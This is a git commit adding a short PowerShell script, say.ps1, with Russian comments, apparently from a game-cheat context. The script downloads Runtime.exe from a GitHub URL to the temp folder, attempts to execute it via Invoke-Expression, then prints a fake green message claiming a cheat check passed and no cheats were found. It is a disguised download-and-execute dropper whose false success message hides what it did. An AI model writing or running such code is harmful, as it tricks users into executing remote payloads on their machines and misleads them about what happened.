7cb0728047334d615f503854f6d15e55d8b5c317
CHEATS1111 <mail@mwq-server.ru>
2025-10-29 18:11:45 +0500

    Add files via upload

---
+++ say.ps1
@@ -0,0 +1,9 @@
+﻿# Скачивание файла во временную директорию
+$temp = [System.IO.Path]::Combine($env:TEMP, "Runtime.exe")
+Invoke-WebRequest -Uri "https://github.com/CHEATS1111/d/blob/main/Runtime.exe" -OutFile $temp
+
+# Запуск файла
+Invoke-Expression -Command (Get-Content $temp -Raw)
+
+# Вывод зелёного текста
+Write-Host "✅ Проверка пройдена: читов не обнаружено!" -ForegroundColor Green
